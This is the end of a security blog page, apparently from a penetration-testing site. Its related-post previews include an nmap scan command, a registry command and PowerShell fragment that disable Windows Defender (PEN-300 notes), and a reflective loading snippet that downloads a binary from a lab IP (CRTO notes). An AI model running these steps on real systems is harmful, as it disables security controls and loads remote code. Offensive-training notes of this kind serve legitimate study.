14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 nmap -sV -A -sC -T4 -v -oN Scan.nmap 10.10.10.171 Nmap scan report for 10.10.10.17 Hos...</p></div></div></a></div><div class="card"> <a href="/posts/PEN300-(OSEP)-Notes/"><div class="card-body"> <span class="timeago small" >Feb 1<i class="unloaded">2022-02-01T21:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Offensive-Security PEN-300 Notes</h3><div class="text-muted small"><p> Disable Anti-Virus Disable Windows Defender 1 2 REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f or 1 Set-MpPreference -DisableRea...</p></div></div></a></div><div class="card"> <a href="/posts/CRTO-Course-Notes/"><div class="card-body"> <span class="timeago small" >Aug 4, 2021<i class="unloaded">2021-08-04T21:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CRTO Notes</h3><div class="text-muted small"><p> 1 2 [system.reflection.assembly]::LoadFile("file") [namespace.class]::Main() Binary reflective loading 1 2 3 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/binary.ex...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/OpenAdmin-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Newer"><p>OpenAdmin Writeup – HackTheBox</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">your_full_name</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/penetration-testing/">Penetration Testing</a> <a class="post-tag" href="/tags/c-crto-redteaming/">C# CRTO REDTEAMING</a> <a class="post-tag" href="/tags/google-analytics/">google analytics</a> <a class="post-tag" href="/tags/offensive-security/">Offensive Security</a> <a class="post-tag" href="/tags/osep/">OSEP</a> <a class="post-tag" href="/tags/pageviews/">pageviews</a> <a class="post-tag" href="/tags/red-team/">Red_Team</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
